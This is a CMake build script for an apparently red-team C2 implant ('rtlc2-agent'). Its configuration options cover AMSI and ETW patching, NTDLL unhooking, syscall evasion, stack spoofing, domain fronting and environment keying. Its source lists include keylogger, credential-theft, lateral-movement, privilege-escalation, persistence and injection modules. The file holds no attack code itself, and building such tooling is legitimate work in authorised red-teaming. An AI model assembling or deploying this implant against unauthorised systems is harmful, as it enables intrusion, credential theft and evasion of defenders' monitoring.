cmake_minimum_required(VERSION 3.16)
project(rtlc2-agent VERSION 0.7.0 LANGUAGES C CXX ASM)

set(CMAKE_CXX_STANDARD 17)
set(CMAKE_CXX_STANDARD_REQUIRED ON)
set(CMAKE_C_STANDARD 11)

# Build type
if(NOT CMAKE_BUILD_TYPE)
    set(CMAKE_BUILD_TYPE Release)
endif()

# Compiler options
if(MSVC)
    add_compile_options(/W4 /O2 /MT)
    add_compile_definitions(_CRT_SECURE_NO_WARNINGS WIN32_LEAN_AND_MEAN)
else()
    add_compile_options(-Wall -Wextra -O2)
    if(WIN32)
        add_compile_options(-static -static-libgcc -static-libstdc++)
    endif()
endif()

# Platform detection
if(WIN32)
    add_compile_definitions(RTLC2_WINDOWS)
elseif(APPLE)
    add_compile_definitions(RTLC2_MACOS)
else()
    add_compile_definitions(RTLC2_LINUX)
endif()

# Agent configuration (embedded at compile time)
set(RTLC2_C2_HOST "127.0.0.1" CACHE STRING "C2 server host")
set(RTLC2_C2_PORT "443" CACHE STRING "C2 server port")
set(RTLC2_SLEEP_INTERVAL "5" CACHE STRING "Default sleep interval in seconds")
set(RTLC2_JITTER "10" CACHE STRING "Default jitter percentage")
set(RTLC2_USE_TLS "0" CACHE STRING "Use TLS (1=yes, 0=no)")
set(RTLC2_AES_KEY "" CACHE STRING "AES master key (hex)")
set(RTLC2_USER_AGENT "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" CACHE STRING "HTTP User-Agent")

# OPSEC options
set(RTLC2_SLEEP_MASK "0" CACHE STRING "Sleep mask (0=basic, 1=ekko, 2=foliage)")
set(RTLC2_STACK_SPOOF "0" CACHE STRING "Enable stack spoofing")
set(RTLC2_ETW_PATCH "0" CACHE STRING "Patch ETW at startup")
set(RTLC2_UNHOOK_NTDLL "0" CACHE STRING "Unhook NTDLL at startup")
set(RTLC2_SYSCALL_METHOD "none" CACHE STRING "Syscall method (none/direct/indirect/hells_gate)")
set(RTLC2_EVASION_DELAY_EXEC "0" CACHE STRING "Delay execution (ms)")
set(RTLC2_EVASION_ENV_KEYING "0" CACHE STRING "Environment keying")
set(RTLC2_EVASION_DIRECT_SYSCALLS "0" CACHE STRING "Direct syscalls")
set(RTLC2_EVASION_INDIRECT_SYSCALLS "0" CACHE STRING "Indirect syscalls")
set(RTLC2_EVASION_ETW_BLINDING "0" CACHE STRING "ETW blinding")
set(RTLC2_EVASION_HOOK_BYPASS "0" CACHE STRING "User-mode hook bypass")
set(RTLC2_DEBUG "0" CACHE STRING "Enable debug output to stderr")

# OPSEC - Kill date and working hours
set(RTLC2_KILL_DATE "0" CACHE STRING "Kill date (Unix timestamp, 0=disabled)")
set(RTLC2_WORK_START_HOUR "0" CACHE STRING "Work start hour (24h, 0=disabled)")
set(RTLC2_WORK_END_HOUR "0" CACHE STRING "Work end hour (24h)")
set(RTLC2_WORK_DAYS "127" CACHE STRING "Working days bitmask (127=all)")
set(RTLC2_SPAWN_TO "C:\\\\Windows\\\\System32\\\\RuntimeBroker.exe" CACHE STRING "Spawn-to process")
set(RTLC2_AMSI_PATCH "0" CACHE STRING "Patch AMSI at startup")
set(RTLC2_HEAP_ENCRYPT "0" CACHE STRING "Heap encryption during sleep")
set(RTLC2_ETWTI_PATCH "0" CACHE STRING "Patch ETW-TI at startup")
set(RTLC2_MODULE_STOMP "0" CACHE STRING "Module stomping for shellcode")
set(RTLC2_ENV_KEY_DOMAIN "" CACHE STRING "Environment keying: required domain")
set(RTLC2_ENV_KEY_USER "" CACHE STRING "Environment keying: required user")
set(RTLC2_ENV_KEY_FILE "" CACHE STRING "Environment keying: required file marker")

# Transport configuration
set(RTLC2_TRANSPORT_TYPE "http" CACHE STRING "Transport type (http/tcp/dns/doh)")
set(RTLC2_DOH_RESOLVER "https://cloudflare-dns.com/dns-query" CACHE STRING "DoH resolver URL")
set(RTLC2_FRONT_DOMAIN "" CACHE STRING "Domain fronting CDN domain (empty=disabled)")
string(RANDOM LENGTH 8 ALPHABET "0123456789" RTLC2_OBFSTR_SEED_VAL)
set(RTLC2_OBFSTR_SEED "${RTLC2_OBFSTR_SEED_VAL}" CACHE STRING "Obfuscation string seed")

configure_file(
    ${CMAKE_CURRENT_SOURCE_DIR}/include/config.h.in
    ${CMAKE_CURRENT_BINARY_DIR}/config.h
)

# Core source files (cross-platform)
set(AGENT_SOURCES
    src/main.cpp
    src/core/agent.cpp
    src/core/task.cpp
    src/transport/http.cpp
    src/crypto/aes.cpp
    src/crypto/xor.cpp
    src/crypto/obfuscation.cpp
    src/evasion/sleep.cpp
    src/evasion/sandbox.cpp
    src/bof/loader.cpp
    src/modules/socks5.cpp
    src/modules/portscan.cpp
    src/modules/portfwd.cpp
    src/modules/lolbas.cpp
    src/modules/recon.cpp
    src/transport/tcp.cpp
    src/transport/dns.cpp
    src/transport/doh.cpp
    src/execution/shellcode_exec.cpp
    src/core/jobs.cpp
    src/modules/clipboard.cpp
    src/crypto/shellcode_encoder.cpp
    src/modules/persistence.cpp
    src/modules/privesc.cpp
    src/modules/rportfwd.cpp
    src/execution/powershell.cpp
)

# Windows-specific sources
if(WIN32)
    # Architecture-specific syscall gate (Windows only - contains syscall instruction)
    if(CMAKE_SIZEOF_VOID_P EQUAL 4)
        # x86 (32-bit)
        list(APPEND AGENT_SOURCES src/syscalls/syscall_gate_x86.S)
    elseif(CMAKE_SYSTEM_PROCESSOR MATCHES "aarch64|ARM64|arm64")
        # ARM64
        list(APPEND AGENT_SOURCES src/syscalls/syscall_gate_arm64.S)
    else()
        # x64 (default)
        list(APPEND AGENT_SOURCES src/syscalls/syscall_gate.S)
    endif()

    list(APPEND AGENT_SOURCES
        src/evasion/injection.cpp
        src/evasion/amsi.cpp
        src/evasion/etw.cpp
        src/evasion/unhook.cpp
        src/evasion/stack_spoof.cpp
        src/evasion/ppid_spoof.cpp
        src/evasion/argue.cpp
        src/syscalls/resolver.cpp
        src/syscalls/syscalls.cpp
        src/modules/shell_win.cpp
        src/modules/sysinfo_win.cpp
        src/modules/token.cpp
        src/modules/credentials.cpp
        src/modules/keylogger.cpp
        src/modules/migrate.cpp
        src/modules/lateral.cpp
        src/transport/smb.cpp
        src/execution/dotnet.cpp
        src/execution/pe_loader.cpp
        src/modules/registry_write.cpp
        src/modules/services.cpp
        src/evasion/heap_encrypt.cpp
        src/evasion/etwti.cpp
        src/evasion/module_stomp.cpp
        src/evasion/hw_bp_hook.cpp
        src/evasion/threadless_inject.cpp
        src/modules/persistence_win.cpp
    )

    # Assembly files for return address spoofing (x64 only)
    if(CMAKE_SIZEOF_VOID_P EQUAL 8)
        list(APPEND AGENT_SOURCES
            src/evasion/spoof_call.S
        )
    else()
        list(APPEND AGENT_SOURCES
            src/evasion/spoof_call_x86.S
        )
    endif()
else()
    list(APPEND AGENT_SOURCES
        src/modules/shell_posix.cpp
        src/modules/sysinfo_posix.cpp
        src/modules/persistence_posix.cpp
    )
endif()

add_executable(rtlc2-agent ${AGENT_SOURCES})

target_include_directories(rtlc2-agent PRIVATE
    ${CMAKE_CURRENT_SOURCE_DIR}/include
    ${CMAKE_CURRENT_BINARY_DIR}
)

# Debug output
if(RTLC2_DEBUG STREQUAL "1")
    target_compile_definitions(rtlc2-agent PRIVATE RTLC2_DEBUG)
endif()

# Link libraries
if(WIN32)
    target_link_libraries(rtlc2-agent PRIVATE
        winhttp
        ws2_32
        crypt32
        advapi32
        ntdll
        shlwapi
        dbghelp
        netapi32
        wbemuuid
        ole32
        oleaut32
        shell32
        bcrypt
        taskschd
    )
else()
    find_package(OpenSSL REQUIRED)
    find_package(CURL REQUIRED)
    target_link_libraries(rtlc2-agent PRIVATE
        OpenSSL::SSL
        OpenSSL::Crypto
        CURL::libcurl
        pthread
    )
endif()

# Strip symbols in release
if(CMAKE_BUILD_TYPE STREQUAL "Release")
    if(NOT MSVC)
        add_custom_command(TARGET rtlc2-agent POST_BUILD
            COMMAND ${CMAKE_STRIP} $<TARGET_FILE:rtlc2-agent> 2>/dev/null || true
        )
    endif()
endif()
